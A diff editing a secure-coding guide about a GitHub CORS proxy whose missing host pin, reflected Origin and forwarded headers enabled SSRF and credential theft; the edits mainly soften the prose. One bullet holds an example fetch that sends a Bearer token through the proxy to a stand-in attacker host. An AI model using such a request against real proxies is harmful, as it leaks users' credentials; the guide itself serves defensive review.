@@ -20,29 +20,28 @@ A browser cannot talk git smart-HTTP to GitHub directly, because GitHub serves n
 CORS headers on those endpoints, so an admin SPA that runs isomorphic-git in a
 Service Worker needs a tiny server-side proxy. The proxy receives
 `/api/cors/github.com/owner/repo/info/refs`, fetches
-`https://github.com/owner/repo/info/refs`, and reflects CORS headers back. Twenty
-lines of Hono. What could go wrong.
+`https://github.com/owner/repo/info/refs`, and reflects CORS headers back. About
+twenty lines of Hono.
 
-A security audit on a content-admin SPA (2026-06-11) answered that. The deployed
+A security audit on a content-admin SPA (2026-06-11) found the problem. The deployed
 proxy built its target as `https://${path}` straight from the request path with no
-validation, reflected any `Origin` header, and copied **every** inbound header to
+validation, reflected any `Origin` header, and copied every inbound header to
 the upstream fetch, `Authorization` and `Cookie` included. That one endpoint opened
 three separate attacks:
 
-- **Credential exfiltration.** `fetch('https://admin.example/api/cors/attacker.tld/x',
-  {headers: {Authorization: 'Bearer ' + token}})` — the worker dutifully delivers the
+- Credential exfiltration. `fetch('https://admin.example/api/cors/attacker.tld/x',
+  {headers: {Authorization: 'Bearer ' + token}})` — the worker delivers the
   token to the attacker's server.
-- **SSRF / anonymising relay.** The outbound fetch originates from the edge worker.
+- SSRF / anonymising relay. The outbound fetch originates from the edge worker.
   Any third-party API, any internal surface reachable from that network, now has the
   worker as a free proxy in front of it.
-- **Cross-site abuse.** With `Access-Control-Allow-Origin` reflected, any website a
+- Cross-site abuse. With `Access-Control-Allow-Origin` reflected, any website a
   visitor opens can drive the proxy from their browser.
 
-Here is the part that stings: the standalone Worker this code replaced **had** the
-host pin and the Origin allowlist. Both protections vanished when the proxy was
-ported into the main app, because nobody re-derived the threat model for "the same
-code, but mounted at /api". Treat a port as a rewrite, and give it the review the
-original got.
+The standalone Worker this code replaced had the host pin and the Origin allowlist.
+Both protections vanished when the proxy was ported into the main app, because nobody
+re-derived the threat model for "the same code, but mounted at /api". Review a port
+the way you reviewed the original.
 
 ## How to apply
 
@@ -75,9 +74,9 @@ export const corsProxy = async (c: Context): Promise<Response> => {
 }
 ```
 
-The path regex pulls double duty. It pins the **host** (the string must start with
-`github.com/`) and the **path shape** (only the three endpoints isomorphic-git
-actually calls). `Authorization` still flows, which is the proxy's whole job, but it
+The path regex pulls double duty. It pins the host (the string must start with
+`github.com/`) and the path shape (only the three endpoints isomorphic-git
+actually calls). `Authorization` still flows, which is the proxy's job, but it
 can only ever reach the pinned host.
 
 ## Anti-patterns
@@ -95,7 +94,7 @@ const headers = new Headers(c.req.raw.headers)
 
 The first one announces itself when your worker shows up in someone's SSRF writeup.
 The other two give you nothing: exfiltration through a permissive proxy produces no
-error on your side, and that silence is what makes the whole class so dangerous.
+error on your side, so it can run unnoticed.
 
 ## Enforcement
 
